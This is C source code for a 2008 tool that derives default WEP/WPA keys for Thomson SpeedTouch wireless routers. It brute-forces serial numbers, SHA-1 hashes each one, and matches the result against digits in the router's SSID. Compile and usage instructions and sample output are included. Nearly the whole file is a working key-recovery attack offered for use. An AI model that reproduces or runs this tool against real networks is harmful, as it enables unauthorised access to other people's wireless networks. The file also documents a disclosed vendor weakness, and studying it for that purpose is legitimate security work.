/*
   **************************************************************************
   *                                                                        *
   * Default WEP/WPA key generation for Thomson series wireless routers     *
   *                                                                        *
   *   Date:   March 15th 2008                                                *
   *   Author: Kevin Devine <wyse101@gmail.com>                             *
   *   WWW:    http://weiss.u40.hosting.digiweb.ie/                         *
   *                                                                        *
   **************************************************************************

   AFAIK, this is a well known problem by some ISP.
   It is likely to affect any owner of a Thomson wireless router with 
   default settings installed.

   To compile using gcc:

     gcc -fomit-frame-pointer -O3 -funroll-all-loops stkeys.c sha1.c -ostkeys

   If on Linux, replace the sha1.c parameter with: -lcrypto (must have the library installed libssl-dev package)
   
   Example usage for ST585v6 router:
      
      SSID: "SpeedTouchF8A3D0":

   c:\stkeys -v -iF8A3D0

   Serial Number: CP0615**109 - potential key = 742DA831D2  <- this is the right one
   Serial Number: CP0621**AHJ - potential key = 00651124D9

   Found 2 potential keys.

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>

#ifdef linux
  #include <openssl/sha.h>
  #define SHA1_Final(x,y) SHA1_Final(y,x)
#else
  #include "sha1.h"
  #define SHA1_Init SHA1Reset
  #define SHA1_Update SHA1Input
  #define SHA1_Final SHA1Result
  #define SHA_CTX SHA1Context
#endif

typedef unsigned char u8;
typedef unsigned int u32;

const u8 charTable[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const u8 hexTable[]="0123456789ABCDEF";
      u8 serial[13]={'C','P','0',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

#define SERIAL_LENGTH 12
#define MAX_SSID_OCTETS 6
#define DEFAULT_KEY_SIZE 5

#define hexmsb(x)(hexTable[((x & 0xf0) >> 4)])
#define hexlsb(x)(hexTable[ (x & 0x0f)])

void usage(char **argv) {

    fprintf(stdout,"\n\tUsage: %s [ -i <ssid octets> ] [ -o <output file> ]\n"
                   "\n\t -i : SSID octets from Thomson router"
                   "\n\t -o : Specifies output file for potential keys"
                   "\n\t -v : Print key to stdout when potential key found\n\n",*argv);
                 
    exit(0);
}

/*
 * convert hexadecimal ssid string to binary
 * return 0 on error or binary length of string
 *
 */
u32 str2ssid(u8 ssid[],u8 *str) {

    u8 *p,*q = ssid;
    u32 len = strlen(str);

    if( (len % 2) || (len > MAX_SSID_OCTETS) )
      return(0);

    for(p = str;(*p = toupper(*p)) && (strchr(hexTable,*p)) != 0;) {

      if(--len % 2) {
        *q = ((u8*)strchr(hexTable,*p++) - hexTable);
        *q <<= 4;
      } else {
        *q++ |= ((u8*)strchr(hexTable,*p++) - hexTable);
      }
    }
    return( (len) ? 0 : (p - str) / 2);
}

/*
 * print 5 bytes to output file
 *
 */
void dump_key(FILE *out, u8 *key) {
  
    u32 i;
    u8 *p = key;

    for(i = 0;i < DEFAULT_KEY_SIZE;i++)
      fprintf(out,"%.2X",*p++);

    fprintf(out,"\n");
}

int main(int argc, char **argv) {

    u8 sha1_digest[40]={0};
    u8 ssid[8]={0},buf[8]={0},year,week,x1,x2,x3;
    u32 keys = 0,ssidLen = 0,verbose = 0, opt = 0;
    u8 *strId = NULL;
    FILE *ofile = NULL;

    SHA_CTX sha1_ctx;

    if(argc > 1) {
      while( (opt = getopt(argc, argv,"vo:i:")) != -1) {

        switch(opt) {

          case 'i' :
            strId = optarg;
            break;

          case 'o' :
            if((ofile = fopen(optarg,"wb")) == NULL) {
              fprintf(stderr,"\nCannot open %s for output.\n",optarg);
              return(0);
            }
            break;

          case 'v' :
            verbose++;
            break;

          default:
            usage(argv);
        }
      }

      if(!strId) usage(argv);

      if(!(ssidLen = str2ssid(ssid,strId))) usage(argv);

      fprintf(stdout,"\nWorking...\n\n");

        // generate values only for 2005/2006..change if you want.

        for(year = 4;year <= 99;year++) {

          serial[3] = year | '0';

          // 52 weeks of the year

          for(week = 1;week <= 52;week++) {
            
            serial[4] = (week / 10) + '0';
            serial[5] = (week % 10) + '0';

            for(x1 = 0;x1 < 36;x1++) {

              serial[6] = hexmsb(charTable[x1]);
              serial[7] = hexlsb(charTable[x1]);

              for(x2 = 0;x2 < 36;x2++) {

                serial[8] = hexmsb(charTable[x2]);
                serial[9] = hexlsb(charTable[x2]);

                for(x3 = 0;x3 < 36;x3++) {

                  serial[10] = hexmsb(charTable[x3]);
                  serial[11] = hexlsb(charTable[x3]);

                  // hash serial number with sha-1

                  SHA1_Init(&sha1_ctx);
                  SHA1_Update(&sha1_ctx,serial,SERIAL_LENGTH);
                  SHA1_Final(&sha1_ctx,sha1_digest);

                  // compare SSID octets with last number of bytes supplied

                  if(memcmp(&sha1_digest[(20-ssidLen)],ssid,ssidLen) == 0) {

                    keys++;

                    if(verbose) {

                      memcpy(buf,serial,6);

                      fprintf(stdout,
                              " ",
                              buf,charTable[x1],charTable[x2],charTable[x3]);

                      dump_key(stdout,sha1_digest);
                    }
                    if(ofile) {
                      dump_key(ofile,sha1_digest);
                    }
                  }
                }
              }
            }
          }
        }
      fprintf(stdout,"\n %d keys found.\n",keys);

      if(ofile) fclose(ofile);
    }
    else {
        usage(argv);
    }
    return(0);
}
